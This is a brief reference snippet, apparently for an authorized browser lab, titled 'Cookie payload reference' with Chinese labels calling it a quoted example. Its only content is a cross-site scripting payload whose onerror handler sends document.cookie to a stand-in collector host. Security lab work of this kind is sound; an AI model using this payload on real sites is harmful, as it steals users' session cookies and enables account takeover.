# Cookie payload reference

前置条件: authorized browser lab. 攻击链: quoted example.

```html
<img src=x onerror="fetch('https://collector.invalid/?c='+document.cookie)">
```
